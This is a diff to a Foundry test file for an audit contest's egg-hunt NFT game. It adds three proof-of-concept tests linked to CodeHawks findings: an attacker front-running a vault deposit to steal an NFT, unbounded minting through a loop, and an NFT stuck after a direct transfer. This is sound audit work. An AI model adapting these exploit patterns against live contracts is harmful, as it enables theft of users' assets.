@@ -90,6 +90,62 @@ contract EggGameTest is Test {
         vault.withdrawEgg(20);
     }
 
+    // https://codehawks.cyfrin.io/c/2025-04-eggstravaganza/s/cm959qfdu0003lb03szxxqbts
+    function test_Attacker_Steals_Egg_FromVault() public {
+        vm.prank(address(game));
+        nft.mintEgg(address(vault), 999);
+
+        // assuming bob is the attacker
+        vm.prank(bob);
+        vault.depositEgg(999, bob);
+
+        assertEq(vault.eggDepositors(999), bob);
+        assertTrue(vault.isEggDeposited(999));
+
+        vm.prank(bob);
+        vault.withdrawEgg(999);
+
+        assertEq(nft.ownerOf(999), bob);
+    }
+
+    // https://codehawks.cyfrin.io/c/2025-04-eggstravaganza/s/cm928fyoh0005l503j9hytucc
+    function testUnboundedMinting() public {
+        game.startGame(600); // Start game for 10 minutes
+        game.setEggFindThreshold(100); // Set egg chance to 100%
+    
+        vm.startPrank(alice); // Simulate attacker
+        for (uint256 i = 0; i < 50; i++) {
+            game.searchForEgg();
+        }
+        vm.stopPrank();
+    
+        uint256 totalEggsMinted = game.eggCounter();
+        assertEq(totalEggsMinted, 50, "Unbounded minting confirmed");
+    }
+
+    // https://codehawks.cyfrin.io/c/2025-04-eggstravaganza/s/cm96sqfqf0007jy03k0q0vt3l
+    function testDirectTransferToVault() public {
+        // Start the game with a duration.
+        uint256 duration = 200;
+        game.startGame(duration);
+
+        // Set threshold to 100 to guarantee that an egg is always found.
+        game.setEggFindThreshold(100);
+
+        // Alice attempts to search for an egg.
+        vm.startPrank(alice);
+        game.searchForEgg();
+        uint256 eggCounter = game.eggCounter();
+
+        nft.transferFrom(alice, address(vault), eggCounter);
+
+        vm.expectRevert("Egg not in vault");
+        vault.withdrawEgg(eggCounter); // egg stuck in vault
+        vm.stopPrank();
+        assertEq(nft.ownerOf(eggCounter), address(vault));
+    }
+    
+
     // -----------------------------------------
     // EggstravaganzaNFT Tests
     // -----------------------------------------
